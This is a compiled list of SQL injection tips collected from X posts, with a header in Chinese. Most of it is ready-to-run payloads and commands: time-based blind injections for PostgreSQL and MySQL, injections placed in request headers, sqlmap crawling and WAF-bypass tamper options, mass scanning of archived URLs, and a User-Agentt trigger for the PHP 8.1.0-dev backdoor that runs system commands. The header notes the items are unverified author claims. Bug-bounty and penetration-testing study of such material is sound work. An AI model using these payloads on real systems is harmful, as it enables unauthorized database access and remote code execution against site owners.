# X 语料 · 残余回收（SQL 注入）

来源：X 公开贴子，含可直接套用的骨架（命令行 / 载荷 / 请求头 / 绕过变体）。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[SQL 注入](../by-type/sql-injection.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-sqli-1（193 条）、x-exp-sqli（42 条） · 本文 42 行

- Simple payload for postgresql
  1 AND 1=(select 1 from PG_SLEEP(10)) --' AND 1=(select 1 from PG_SLEEP(10)) OR '1'='
- Blind SQL Injection
  phone_number=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&pin=1&submit=Continuar
  https://hackerone.com/reports/1069531
- If you find PHP 8.1.0-dev then try RCE & SQLi
  User-Agentt: zerodiumsleep(5);
  User-Agentt: zerodiumsystem('id');
- Another sql injection payload:
  14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515
- Header-Based Blind SQL injection :
  cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
- SQLMap from Waybackurls
  waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
- Do you know that sqlmap has its own crawler? Run in the background easily:
  sqlmap -u 'https://target\.com' --crawl=3 --random-agent --batch --forms --threads=5 --hostname --timeout=15 --retries=1 --time-sec 12
- Find SQLi using Jeeves
  echo "http://exampl.com" | gf sqli | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 10
  https://github.com/ferreiraklet/Jeeves
- If you find sql injection and encounter a 403 or waf block, be sure to try tamper scripts and update your sqlmap
  sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash
- Narrow scope to ?id= parameters from wayback:
  waybackurls --dates domain(.)com | grep '?id='
  Payload : if(now()=sysdate(),SLEEP(8),0)
- SQL Injection On Sitemap.xml endpoint !
  target[.]com/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(9),2356)#
  sleep payload
  [1;SELECT IF((8303>8302),SLEEP(9),2356)#] = 9s sleep
- If you found a syntax error but are stuck with server delay and waf block, be sure to use --delay (with Tor or VPN) so you can solve the problem
  sqlmap -u 'https :// domain[.]X/blablabla.php?kID=1%27' -p parameter --dbs --delay=3
- Detecting SQL Injection through Headers
  If the SQL injection works, there will be a 30sec delay between the request and response!
  HEADERS:
  Accept: "' or sleep(30)='"
  Accept-Charset: "' or sleep(30)='"
